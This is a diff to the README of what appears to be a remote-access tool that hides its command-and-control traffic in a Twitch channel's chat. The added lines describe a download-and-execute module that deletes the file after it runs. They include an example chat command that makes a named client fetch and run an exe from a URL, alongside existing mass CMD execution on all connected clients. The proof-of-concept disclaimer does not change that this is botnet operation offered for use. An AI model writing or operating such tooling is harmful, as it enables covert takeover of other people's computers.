@@ -12,7 +12,8 @@ The usage of this program directly violates the Twitch Developer Agreement. The 
 This program was created as a Proof of Concept and it is not intended to be used in a malicious way. I am not responsible for any damages or criminal charges that come from using it.
 
 # Features
-Currently the program only has one main feature which is a cmd command. It will be demo'd below.
+```cmd``` Windows CMD commands.
+```de``` Download and execute. File is removed after execution.
 
 # Usage
 Navigate to the twitch page of the channel you selected when making the program.
@@ -27,17 +28,18 @@ Upon connection to a server, a new client will announce its presence and client 
 
 ![List connections.](https://i.imgur.com/RY81sGt.png)
 
-This program also features a cmd command. It can be used on a per-user basis or as a mass command to all connected client.
+This program also features different modules which can be used.
 ```
 !act client command action true
 ```
 - Act is the keyword to use a command for the client.
 - Client specifies a singular user or a group. You can use a specific name (ex: DESKTOP-TEST) or 'all'.
-- Command specifies the intended module to use. Currently it only supports cmd.
-- Action is what to use with the selected module. For example 'start.' will open the current directory on the clients PC.
+- Command specifies the intended module to use.
+- Action is what to use with the selected module. For example 'start.' will open the current directory on the clients PC when using CMD.
 - True is just a placeholder value as I was too lazy to scrub \r\n off the final value. You can write anything.
 
-An example command would be as follows:
+An example cmd command would be:
+
 ```
 !act all cmd start. true
 ```
@@ -45,6 +47,13 @@ An example command would be as follows:
 ![Client action.](https://i.imgur.com/g7d5P83.png)
 
 This would open the current directory on every connected clients PC.
+
+An example download+execute command would be:
+
+```
+!act DESKTOP-TEST de https://example.com/files/file.exe true
+```
+It currently only supports exe files.
 
 # Creating the program.
 ### Coming soon: a builder.
